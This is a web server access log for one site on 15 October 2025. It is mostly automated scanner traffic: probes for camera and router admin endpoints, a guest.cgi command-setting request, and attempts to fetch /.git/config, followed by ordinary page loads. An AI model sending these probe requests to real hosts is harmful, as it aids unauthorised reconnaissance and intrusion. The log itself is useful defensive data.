144.6.14.143 - - [15/Oct/2025:16:39:35 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:40 +0800] "GET /ISAPI/System/status HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:40 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:41 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:46 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:46 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:46 +0800] "GET /cgi-bin/luci/ HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:48 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:48 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:49 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:49 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:49 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:53 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:56 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:57 +0800] "GET /login.rsp HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:01 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:13 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:14 +0800] "GET /ISAPI/Security/userCheck HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:14 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:15 +0800] "GET /ISAPI/Streaming/channels/101/picture HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:15 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:15 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:16 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:16 +0800] "GET /cgi-bin/guest.cgi?command=set&fname=test&data=test HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:17 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:21 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:21 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:26 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:26 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:27 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:27 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:39 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:44 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:48 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:53 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:57 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:58 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:58 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:40:59 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:41:04 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:41:04 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:41:05 +0800] "GET /tmpfs/auto.jpg HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:41:05 +0800] "GET /tmpfs/auto.jpg HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:41:06 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
34.79.175.219 - - [15/Oct/2025:17:00:52 +0800] "GET / HTTP/1.1" 404 159 "-" "python-requests/2.32.5"
204.76.203.212 - - [15/Oct/2025:17:07:52 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [15/Oct/2025:17:25:07 +0800] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
196.251.73.10 - - [15/Oct/2025:17:27:03 +0800] "GET /.git/config HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/75.0.3770.142 Chrome/75.0.3770.142 Safari/537.36"
93.123.109.214 - - [15/Oct/2025:17:27:12 +0800] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03q5^\x0CQ\x8BaF\xF3\xB5\x81\x072" 400 157 "-" "-"
93.123.109.214 - - [15/Oct/2025:17:27:13 +0800] "GET / HTTP/1.1" 400 157 "-" "-"
93.123.109.214 - - [15/Oct/2025:17:27:13 +0800] "GET / HTTP/1.1" 404 179 "-" "l9tcpid/v1.1.0"
93.123.109.214 - - [15/Oct/2025:17:48:28 +0800] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\xCE\xF5\x9D:&_\xA3p\x0Bvi\xDC\x8E\xCF\x1A\xA4\xC2\xF0\xB1Oa\xBD\x9C\xFDwk\x84\xBF\xAE\xCF'\xF2 \x10:\xD2\x85\xB9D\xAC{\xBF\xC7KQ\xCD)\x81\xAC\x9Av\x06l\xA2!\xDE\x93\x81\x8EX\x0E\x9C\xF4\xCF\x03\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
93.123.109.214 - - [15/Oct/2025:17:48:28 +0800] "GET / HTTP/1.1" 400 157 "-" "-"
93.123.109.214 - - [15/Oct/2025:17:48:28 +0800] "GET / HTTP/1.1" 404 179 "-" "l9tcpid/v1.1.0"
87.120.191.91 - - [15/Oct/2025:18:20:20 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [15/Oct/2025:18:21:07 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
66.132.153.116 - - [15/Oct/2025:18:25:13 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
66.132.153.116 - - [15/Oct/2025:18:25:14 +0800] "PRI * HTTP/2.0" 400 157 "-" "-"
66.132.153.116 - - [15/Oct/2025:18:25:19 +0800] "PRI * HTTP/2.0" 400 157 "-" "-"
66.132.153.116 - - [15/Oct/2025:18:25:19 +0800] "GET /robots.txt HTTP/1.1" 404 159 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
195.178.110.15 - - [15/Oct/2025:18:38:33 +0800] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\xDA\xDD\xA02?\xD2~PA\x823\xBCb5\x7F\x1EE\xDB\xF5o\xAF/h^\x8CBA\x8E\xB6\xA1\x0E\x08 \x92f!\x15\x1B\xE0\x88\xB2/\xC5\x9D\x14\xA9\xA6j&\x19\x10\x10\xED%\xE0\x96\xB9?\x8DD\x0E\xE5i{\xF5\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
195.178.110.15 - - [15/Oct/2025:18:38:33 +0800] "GET / HTTP/1.1" 400 157 "-" "-"
195.178.110.15 - - [15/Oct/2025:18:38:33 +0800] "GET / HTTP/1.1" 404 179 "-" "l9tcpid/v1.1.0"
150.109.230.210 - - [15/Oct/2025:18:56:22 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
20.169.83.157 - - [15/Oct/2025:18:58:23 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 zgrab/0.x"
195.178.110.15 - - [15/Oct/2025:19:13:44 +0800] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\xD7'\xB3Wu\x05\xD4[x\xE4\x06\xF2\x82\x02U\x03\xF9\xC4\x0E\x0C\xD3\x85\xF9\xF9\x8D$\x01\x09\xED\x8F\x8B\xE3 \x99'\xD9\xAD/;\x1A\xF4\x95\x11^cQ\x1CMu\xF1\xEBo\xEBD\xE5\xF7\xD7+\xCA\xA94\x87{\x02\x1C\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
195.178.110.15 - - [15/Oct/2025:19:13:44 +0800] "GET / HTTP/1.1" 400 157 "-" "-"
195.178.110.15 - - [15/Oct/2025:19:13:45 +0800] "GET / HTTP/1.1" 404 179 "-" "l9tcpid/v1.1.0"
45.142.193.27 - - [15/Oct/2025:19:16:09 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
124.236.100.56 - - [15/Oct/2025:19:18:41 +0800] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
123.58.209.112 - - [15/Oct/2025:19:24:53 +0800] "\x16\x03\x01\x01\x17\x01\x00\x01\x13\x03\x03\xA8\x02\x87\x8D\x8Dnd\xD3O\x19MU\xA8\xBF\xB1\xBCeF\xC1W\x07\xDEm:\xCB\xE1\x87\x1DQ\x85\xA0\xAB h\x90<H\xDF\x12\xD4\x8F(\xEBD KI\x95>0/u\xB4\x85D\xD7\x9A1O\xCD\xFE\xE4\xB0\x87d\x004\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x09\x00\x9E\xCC\xA8\xCC\xAA\x003\x00=\x00\x16\xC0" 400 157 "-" "-"
123.58.209.112 - - [15/Oct/2025:19:25:03 +0800] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
123.58.209.112 - - [15/Oct/2025:19:25:21 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
123.58.209.112 - - [15/Oct/2025:19:25:21 +0800] "GET /robots.txt HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
123.58.209.112 - - [15/Oct/2025:19:25:21 +0800] "GET /sitemap.xml HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
185.177.72.11 - - [15/Oct/2025:19:33:11 +0800] "GET /.git/config HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Linux; Android 8.1.0; SM-G390F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
93.123.109.214 - - [15/Oct/2025:19:36:09 +0800] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\x1A\xD7\xFC_\x1B%\x9FVE4\x15)N\xC1\xAA\xB5(\xDA\xC4\xAB\xAC\x83\xB7VC\xEC\xF7\xB3\xC8L\xABT g\xEF\xA3^{w)K!e\xEA\xE6\x09n\x800\xE7T\xB6\xFD>\xD5\xCCQ\x18\xEE\x92,\x89#\x8F\x8C\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
93.123.109.214 - - [15/Oct/2025:19:36:09 +0800] "GET / HTTP/1.1" 400 157 "-" "-"
93.123.109.214 - - [15/Oct/2025:19:36:09 +0800] "GET / HTTP/1.1" 404 179 "-" "l9tcpid/v1.1.0"
45.79.181.223 - - [15/Oct/2025:19:45:46 +0800] "\x16\x03\x01\x01" 400 157 "-" "-"
45.79.181.223 - - [15/Oct/2025:19:45:47 +0800] "\x16\x03\x01\x01" 400 157 "-" "-"
176.65.141.87 - - [15/Oct/2025:19:57:16 +0800] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
24.233.29.101 - - [15/Oct/2025:19:59:27 +0800] "HEAD / HTTP/1.1" 404 0 "-" "curl/7.88.1"
24.233.29.101 - - [15/Oct/2025:20:00:53 +0800] "HEAD / HTTP/1.1" 200 0 "-" "curl/7.88.1"
24.233.29.101 - - [15/Oct/2025:20:00:58 +0800] "GET / HTTP/1.1" 200 354 "-" "curl/7.88.1"
24.233.29.101 - - [15/Oct/2025:20:01:09 +0800] "HEAD /assets/index-Drs3Ogex.js HTTP/1.1" 200 0 "-" "curl/7.88.1"
111.165.16.159 - - [15/Oct/2025:20:01:39 +0800] "GET / HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"
111.165.16.159 - - [15/Oct/2025:20:01:39 +0800] "GET /assets/index-Drs3Ogex.js HTTP/1.1" 200 83599 "http://24.233.29.101/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"
111.165.16.159 - - [15/Oct/2025:20:01:40 +0800] "GET /favicon.ico HTTP/1.1" 200 4286 "http://24.233.29.101/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"
111.165.16.159 - - [15/Oct/2025:20:01:47 +0800] "GET /admin/ HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"
111.165.16.159 - - [15/Oct/2025:20:01:52 +0800] "GET /api/ HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"
111.165.16.159 - - [15/Oct/2025:20:01:55 +0800] "GET /assets/index-Drs3Ogex.js HTTP/1.1" 200 83599 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"
170.106.37.134 - - [15/Oct/2025:20:02:40 +0800] "GET / HTTP/1.1" 200 268 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
24.233.29.101 - - [15/Oct/2025:20:04:37 +0800] "GET / HTTP/1.1" 200 354 "-" "curl/7.88.1"
24.233.29.101 - - [15/Oct/2025:20:04:55 +0800] "GET / HTTP/1.1" 200 354 "-" "curl/7.88.1"
111.165.16.159 - - [15/Oct/2025:20:05:05 +0800] "GET / HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"
111.165.16.159 - - [15/Oct/2025:20:05:05 +0800] "GET /assets/index-Drs3Ogex.js HTTP/1.1" 200 83599 "http://kb.devcook.cn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"
111.165.16.159 - - [15/Oct/2025:20:05:05 +0800] "GET /favicon.ico HTTP/1.1" 200 4286 "http://kb.devcook.cn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"
117.208.227.115 - - [15/Oct/2025:20:06:30 +0800] "GET / HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
204.76.203.219 - - [15/Oct/2025:20:08:31 +0800] "GET / HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.212 - - [15/Oct/2025:20:14:38 +0800] "GET / HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
24.233.29.101 - - [15/Oct/2025:20:16:00 +0800] "HEAD / HTTP/2.0" 200 0 "-" "curl/7.88.1"
111.165.16.159 - - [15/Oct/2025:20:16:09 +0800] "GET / HTTP/2.0" 200 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"
111.165.16.159 - - [15/Oct/2025:20:16:09 +0800] "GET /assets/index-Drs3Ogex.js HTTP/2.0" 200 83599 "https://kb.devcook.cn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"
111.165.16.159 - - [15/Oct/2025:20:16:10 +0800] "GET /favicon.ico HTTP/2.0" 200 4286 "https://kb.devcook.cn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"
192.64.113.146 - - [15/Oct/2025:20:18:50 +0800] "HEAD / HTTP/2.0" 200 0 "http://devcook.cn" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
192.64.113.146 - - [15/Oct/2025:20:18:51 +0800] "GET / HTTP/2.0" 200 256 "http://devcook.cn" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0"
207.154.212.47 - - [15/Oct/2025:20:18:54 +0800] "GET / HTTP/1.1" 200 354 "-" "-"
164.92.107.174 - - [15/Oct/2025:20:18:54 +0800] "GET / HTTP/1.1" 200 354 "-" "-"
207.154.212.47 - - [15/Oct/2025:20:18:54 +0800] "GET / HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA34031) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.4179.98 Mobile Safari/537.3"
164.92.107.174 - - [15/Oct/2025:20:18:54 +0800] "GET / HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA34031) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.4179.98 Mobile Safari/537.3"
104.164.173.159 - - [15/Oct/2025:20:18:55 +0800] "GET / HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
104.252.191.135 - - [15/Oct/2025:20:18:55 +0800] "GET / HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
164.92.107.174 - - [15/Oct/2025:20:18:55 +0800] "POST /graphql HTTP/1.1" 405 157 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
207.154.212.47 - - [15/Oct/2025:20:18:55 +0800] "POST /graphql HTTP/1.1" 405 157 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:18:56 +0800] "POST /api HTTP/1.1" 400 154 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
207.154.212.47 - - [15/Oct/2025:20:18:56 +0800] "POST /api HTTP/1.1" 400 154 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:18:56 +0800] "POST /api/graphql HTTP/1.1" 400 154 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:18:57 +0800] "POST /graphql/api HTTP/1.1" 405 157 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
207.154.212.47 - - [15/Oct/2025:20:18:57 +0800] "POST /api/graphql HTTP/1.1" 400 154 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
